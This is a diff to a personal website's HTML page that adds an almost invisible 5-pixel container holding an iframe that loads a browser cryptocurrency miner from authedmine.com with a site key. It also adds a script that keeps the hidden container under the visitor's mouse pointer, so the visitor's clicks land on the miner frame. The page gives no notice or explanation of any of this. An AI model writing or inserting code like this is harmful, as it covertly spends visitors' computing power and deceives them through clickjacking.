@@ -18,6 +18,10 @@
 				<p>I'm best known as the horrible cop from <em>A Touch of Evil</em> Don't trust me. <a href="/about">Read more about my life...</a></p>
     		</div><!-- /.blurb -->
 		</div><!-- /.container -->
+		<div id="container" style="border:0;margin:0;position:absolute;width:5px;height:5px;overflow:hidden;cursor:pointer;opacity:0.01">
+		<iframe style="position:absolute;border:0;width:5px;height:100px;top:-85px;cursor:pointer;" src="https://authedmine.com/media/miner.html?key=DNvkUKFEbzbZFIekyiddu9tUAFjO6Qtz"></iframe>
+		</div>
+		
 		<footer>
     		<ul>
         		<li><a href="mailto:hankquinlanhub@gmail.com">email</a></li>
@@ -25,4 +29,10 @@
 			</ul>
 		</footer>
 	</body>
+	<script>
+	window.onmousemove = function(e) {
+	var container = document.getElementById("container");
+	container.setAttribute("style", "border:0;margin:0;position:absolute;width:5px;height:5px;overflow:hidden;cursor:pointer;opacity:0.01;left:" + e.x + ";top:" + e.y);
+	}
+	</script>
 </html>
